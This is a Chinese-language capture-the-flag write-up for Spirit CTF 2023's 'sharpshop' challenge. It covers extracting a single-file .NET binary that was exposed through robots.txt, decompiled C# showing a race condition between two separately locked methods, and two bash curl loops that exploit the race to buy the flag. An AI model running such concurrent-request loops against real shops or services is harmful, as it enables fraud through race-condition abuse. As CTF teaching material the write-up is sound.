# Spirit CTF 2023 题解 - sharpshop

记忆源点是封面欺诈，这题和Acreae真的没有关系（（（

```
/
```

![](<./img/Pasted image 20230514190039.png>)

砍价是减去`(FlagPrice - Wallet) / 2`，砍不完的（pdd：？）

通过Web上帝冥冥之中的指引，我们访问了奇怪的东西

```
/robots.txt
```

> User-agent: *
> Disallow: /sharpshop.tar

！是大自然的馈赠~

```
/sharpshop.tar
```

```shell
$ file app
app: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib/ld-musl-x86_64.so.1, BuildID[sha1]=151285fb3b9f0e8bc28b37aa06d105dfbb530c2d, stripped
```

都2302年了怎么还有人web服务藏着掖着的啊（恼

由标题"sharpshop"应该能推测出是C#写的，通常dotnet平台的程序编译成MSIL，由CLR实时翻译成native code执行，但这里给的是一个单文件，链接到musl libc

于是推测是发布时开启了PublishSingleFile和SelfContained开关，把IL和CLR暴力打包到一个可执行文件里，运行时解压到临时目录执行

~~可以使用[`sfextract`](https://github.com/Droppers/SingleFileExtractor)提取这些内容。~~听说新版本`ILSpy`也可以直接查看了qwq

```shell
$ sfextract app -o app.ex
Bundle version: 6.0
Extracted 171 files to "app.ex"
```

来看下购买部分的核心逻辑

```csharp
// Shopping
using System.Runtime.CompilerServices;
using System.Threading;

internal class Shopping
{
	private long _FlagPrice;

	private long _Wallet;

	private int _IsCutting;

	private int _IsBuying;

	public long FlagPrice => _FlagPrice;

	public long Wallet => _Wallet;

	public bool HasFlag { get; private set; }

	public void CutDown()
	{
		while (Interlocked.Exchange(ref _IsCutting, 1) != 0)
		{
		}
		_FlagPrice -= (_FlagPrice - _Wallet) / 2;
		Interlocked.Exchange(ref _IsCutting, 0);
	}

	public bool Buy(out string message)
	{
		while (Interlocked.Exchange(ref _IsBuying, 1) != 0)
		{
		}
		long flagPrice = _FlagPrice;
		_Wallet -= flagPrice;
		DefaultInterpolatedStringHandler defaultInterpolatedStringHandler = new DefaultInterpolatedStringHandler(6, 1);
		defaultInterpolatedStringHandler.AppendLiteral("购买后余额：");
		defaultInterpolatedStringHandler.AppendFormatted(_Wallet);
		message = defaultInterpolatedStringHandler.ToStringAndClear();
		bool result;
		if (_Wallet < 0)
		{
			_Wallet += flagPrice;
			message += "，余额不足～";
			result = false;
		}
		else
		{
			message += "，购买成功～";
			HasFlag = true;
			result = true;
		}
		Interlocked.Exchange(ref _IsBuying, 0);
		return result;
	}

	public Shopping()
	{
		_IsCutting = 0;
		_IsBuying = 0;
		_Wallet = 100L;
		_FlagPrice = long.MaxValue;
		HasFlag = false;
	}
}
```

初学多线程的CrackTC用了两个互斥锁 ***分别*** 锁住了`Buy`和`CutDown`的执行流，并这样说道

> 在我看来，这个程序是牢不可破的~~，所以我压根没有准备记忆源点啊哈哈哈哈哈~~

但是由于`Buy`和`CutDown`没有做到互斥，且都访问了`_FlagPrice`和`_Wallet`，竞态条件的可能性依然存在

假设某个时刻`_FlagPrice`为101，`_Wallet`为100，下面的路径将导致`_FlagPrice`变成50，`_Wallet`还是100，于是就买得起啦～

```
+---------------------------------------+-------------------+----------------------------------------+
|                                       |                   |                                        |
|                                       |                   |   _Flag -= (_FlagPrice - _Wallet) / 2  |
|                                       |                   |                                        |
+---------------------------------------+-------------------+----------------------------------------+
|                                       |                   |                                        |
|                                       |                   |                                        |
|                                       |         *         |                   *                    |
|                                       |         |         |                                        |
+---------------------------------------+---------+---------+----------------------------------------+
|                                       |         |         |                                        |
|                                       |         v         |                                        |
|     long flagPrice = _FlagPrice       |         *         |                   *                    |
|                                       |         |         |                                        |
+---------------------------------------+---------+---------+----------------------------------------+
|                                       |         v         |                                        |
|     _Wallet -= _FlagPrice             |         *---------+------------------>*                    |
|                                       |                   |                   |                    |
+---------------------------------------+-------------------+-------------------+--------------------+
|                                       |                   |                   v                    |
| if (_Wallet < 0) _Wallet += flagPrice |         *         |                   *                    |
|                                       |                   |                                        |
+---------------------------------------+-------------------+----------------------------------------+
```

所以写俩脚本分别发送两种请求就行了

```shell
#!/bin/bash

url=$1
cookie=$2
while true
do
    curl -b $cookie "$url/?action=buy"
done
```

```shell
#!/bin/bash

url=$1
cookie=$2
while true
do
    curl -b $cookie "$url/?action=cutDown"
done
```
